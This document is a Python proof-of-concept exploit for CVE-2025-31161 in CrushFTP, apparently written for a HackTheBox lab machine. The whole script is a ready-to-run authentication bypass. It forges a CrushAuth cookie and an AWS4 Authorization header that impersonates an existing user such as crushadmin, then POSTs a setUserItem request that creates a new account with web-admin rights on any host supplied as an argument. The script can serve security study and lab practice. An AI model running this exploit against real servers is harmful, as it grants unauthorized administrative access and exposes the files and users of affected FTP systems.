#https://github.com/NeonPotatoChips/CVEs/tree/main/CVE-2025-31161
#CVE-2025-31161 affects certain versions of CrushFTP
#Attempts to add a new user to ftp server / Tested on soulmate.htb

#imports
import requests
import argparse

#colors
RED = "\033[0;31m"
GREEN = "\033[0;32m"
RESET = "\033[0m"

#functions
def send_exploit(host, port, nuser, npass, tuser):
    """
    Send a GET request with a cookie value (this can be pre-created, as long as it matches an expected input)
    Send a POST request to create a new user.
    """

    #set header
    header = {
        "Cookie": f"currentAuth=5iqw; CrushAuth=1760922116231_ueOBxM1nepHEA4uP6mMxPH3OgW5iqw",
        "Authorization": f"AWS4-HMAC-SHA256 Credential={tuser}/",
        "Connection": "keep-alive",
    }

    #set body
    body = {
        "command": "setUserItem",
        "data_action": "new",
        "serverGroup": "MainUsers",
        "username": nuser,
        "user": '<?xml version="1.0" encoding="UTF-8"?><user type="properties">'
                '<max_logins_ip>8</max_logins_ip>'
                '<real_path_to_user>./users/MainUsers/crushadmin/</real_path_to_user>'
                '<root_dir>/</root_dir>'
                f'<user_name>{nuser}</user_name>'
                '<version>1.0</version>'
                '<max_logins>0</max_logins>'
                '<last_logins>03/28/2025 03:00:26 PM</last_logins>'
                f'<password>{npass}</password>'
                '<site>(CONNECT)(WEB_ADMIN)</site>'
                '<ignore_max_logins>true</ignore_max_logins>'
                '<max_idle_time>0</max_idle_time>'
                f'<username>{tuser}</username>'
                '</user>',
        "xmlItem": "user",
        "vfs_items": '<?xml version="1.0" encoding="UTF-8"?><vfs type="vector"></vfs>',
        "permissions": '<?xml version="1.0" encoding="UTF-8"?><VFS type="properties"><item name="/">(read)(view)(resume)</item></VFS>',
        "c2f": "5iqw"
    }

    #check to see if host is up
    try:
        response = requests.get(f"http://{host}:{port}/WebInterface/function/", headers=header)
        if response.status_code == 200:
            print(f"    {GREEN}[.]{RESET} {host} is up and running")

        else:
            print(f"    {RED}[x]{RESET} Response code {response.status_code} does not match 200")
            exit(1)
    
    except requests.exceptions.ConnectionError:
        print(f"    {RED}[x]{RESET} Could not connect to {host}")
        exit(1)

    #attempt to create new user
    try:
        response = requests.post(f"http://{host}:{port}/WebInterface/function/", headers=header, data=body)
        if response.status_code == 200:
            print(f"    {GREEN}[.]{RESET} User creation was successful")

        else:
            print(f"    {RED}[x]{RESET} Response code {response.status_code} does not match 200")
            exit(1)
    
    except requests.exceptions.ConnectionError:
        print(f"    {RED}[x]{RESET} Could not connect to {host}")
        exit(1)

#main
def main():
    #create parser
    parser = argparse.ArgumentParser(description="POC for CVE-2025-31161")
    parser.add_argument("-host", help="Target url")
    parser.add_argument("-port", help="Target port", default=80)
    parser.add_argument("-nuser", help="User to be created", default="testUser")
    parser.add_argument("-npass", help="Password for new user", default="password123!")
    parser.add_argument("-tuser", help="Existing user to use for exploit", default="crushadmin")
    args = parser.parse_args()

    if not args.host:
        print(f"    {RED}[x]{RESET}: Please enter a target host. Ex: testurl.com")
        exit(1)

    send_exploit(args.host, args.port, args.nuser, args.npass, args.tuser)

    print(f"    {GREEN}[.]{RESET} {args.nuser}:{args.npass} has been created")

if __name__ == "__main__":
    main()